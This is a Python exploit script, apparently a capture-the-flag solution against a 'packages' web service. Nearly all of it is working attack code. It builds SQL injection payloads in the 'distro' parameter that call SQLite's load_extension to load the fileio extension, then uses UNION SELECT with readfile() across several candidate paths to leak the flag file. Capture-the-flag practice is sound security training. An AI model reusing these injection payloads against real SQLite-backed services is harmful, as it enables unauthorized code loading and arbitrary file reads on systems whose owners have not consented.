#!/usr/bin/env python3
# Exploit the packages service to load SQLite's fileio extension and read the flag.

from __future__ import annotations

import re
import urllib.parse
import urllib.request
from typing import Iterable

BASE_URL = "https://packages.challs.pwnoh.io/"
FLAG_RE = re.compile(r"bctf\{[^}]+\}")

LOAD_PAYLOADS: Iterable[str] = (
    "foo\" or load_extension('/sqlite/ext/misc/fileio') --",
    "foo\" or load_extension('/sqlite/ext/misc/fileio','sqlite3_fileio_init') --",
    "foo\" or load_extension('/sqlite/ext/misc/fileio.so') --",
    "foo\" or load_extension('/sqlite/ext/misc/fileio.so','sqlite3_fileio_init') --",
)

FLAG_PATHS: Iterable[str] = (
    "/app/flag",
    "/app/flag.txt",
    "flag",
    "flag.txt",
    "../flag",
    "../flag.txt",
)


# Send a package query and return the status plus body.
def send_query(distro: str, package: str = "") -> tuple[int, str]:
    params = urllib.parse.urlencode({"distro": distro, "package": package})
    url = f"{BASE_URL}?{params}"
    req = urllib.request.Request(url, headers={"User-Agent": "packages-exploit/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body


# Try to load the SQLite fileio extension via SQL injection payloads.
def try_load_extension() -> None:
    for payload in LOAD_PAYLOADS:
        status, body = send_query(payload)
        print(f"[i] load_extension payload (status {status}): {payload!r}")
        if status == 200:
            print("[+] Payload appears successful (HTTP 200).")
            return
        if "already loaded" in body.lower():
            print("[+] Extension already loaded, continuing.")
            return
        print(f"    Response snippet: {body[:200]!r}")
    print("[!] All load_extension payloads returned errors; continuing anyway…")


# Probe readfile() across candidate paths until the flag is leaked.
def try_read_flag() -> str | None:
    for path in FLAG_PATHS:
        payload = f"foo\" union select '', '', readfile('{path}'), '' --"
        status, body = send_query(payload)
        print(f"[i] readfile payload (status {status}) for path {path!r}")
        match = FLAG_RE.search(body)
        if match:
            return match.group(0)
        print(f"    No flag found. Response snippet: {body[:200]!r}")
    return None


# Run the extension load and flag extraction sequences.
def main() -> int:
    print("[*] Attempting to load SQLite fileio extension via SQL injection…")
    try_load_extension()

    print("[*] Attempting to read the flag using readfile()…")
    flag = try_read_flag()
    if flag:
        print(f"[+] Flag: {flag}")
        return 0

    print("[-] Exhausted payloads without finding the flag.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
